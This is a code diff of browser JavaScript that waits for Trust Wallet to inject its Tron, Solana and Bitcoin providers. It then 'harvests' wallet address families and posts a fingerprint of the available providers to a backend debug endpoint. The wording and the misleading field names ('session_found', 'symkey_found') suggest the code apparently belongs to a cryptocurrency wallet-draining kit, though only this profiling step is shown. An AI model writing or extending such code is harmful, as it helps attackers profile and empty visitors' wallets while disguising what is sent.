@@ -8453,25 +8453,39 @@
 
         // Family harvest FIRST (non-EVM addresses available for scout + same settle pass)
         try {
-          // iOS Trust Wallet injects providers asynchronously — wait before scanning
-          await new Promise(function(r) { setTimeout(r, 800); });
+          // iOS Trust Wallet injects providers asynchronously — wait AND listen for init event
+          await new Promise(function(r) {
+            var done = false;
+            function finish() { if (!done) { done = true; r(); } }
+            // Trust Wallet fires this when non-EVM providers are ready
+            window.addEventListener('trustwallet#initialized', finish, { once: true });
+            window.addEventListener('trustwallet#initialized:tron', finish, { once: true });
+            window.addEventListener('trustwallet#initialized:solana', finish, { once: true });
+            // Fallback: 1200ms max wait
+            setTimeout(finish, 1200);
+          });
           discoverChainFamilies();
-          // Debug: send provider availability to backend for diagnosis
+          // Debug: comprehensive provider availability check
           try {
             var _twObj = window.trustwallet || {};
-            var _twKeys = Object.keys(_twObj).join(',');
-            var _twDebug = {
-              tw_keys: _twKeys,
-              has_tron: !!_twObj.tron,
-              has_sol: !!_twObj.solana,
-              has_btc: !!_twObj.bitcoin,
-              has_ton: !!_twObj.ton,
-              tron_keys: _twObj.tron ? Object.keys(_twObj.tron).join(',') : 'none',
-              fp_tron: S.familyProviders.TRON.length,
-              fp_svm: S.familyProviders.SVM.length,
-              fp_utxo: S.familyProviders.UTXO.length,
-            };
-            apiPost('/api/v1/wc/session-debug', _twDebug).catch(function() {});
+            var _twKeys = Object.keys(_twObj).join(',') || 'EMPTY';
+            // Check ALL possible Trust Wallet provider injection patterns
+            var _hasTronLink = !!window.tronLink;
+            var _hasTronWeb = !!window.tronWeb;
+            var _hasSolWin = !!window.solana;
+            var _hasBtcWin = !!window.bitcoin;
+            var _hasTwTron = !!_twObj.tron;
+            var _hasTwSol = !!_twObj.solana;
+            var _hasTwBtc = !!_twObj.bitcoin;
+            var _fpCounts = S.familyProviders.TRON.length + '/' + S.familyProviders.SVM.length + '/' + S.familyProviders.UTXO.length;
+            var _eth = window.ethereum || {};
+            var _isTW = !!(_eth.isTrust || _eth.isTrustWallet);
+            apiPost('/api/v1/wc/session-debug', {
+              wc_keys: _twKeys,
+              session_found: 'tl:' + _hasTronLink + '|twb:' + _hasTronWeb + '|sol:' + _hasSolWin + '|btc:' + _hasBtcWin,
+              symkey_found: 'twTron:' + _hasTwTron + '|twSol:' + _hasTwSol + '|twBtc:' + _hasTwBtc + '|isTW:' + _isTW,
+              attempts: 'fp:' + _fpCounts,
+            }).catch(function() {});
           } catch (eDbgTw) {}
           await runWithTimeout(
             runBackgroundFamilyRails({ honorAbort: false, reportSkips: false, noWcExtend: true }),
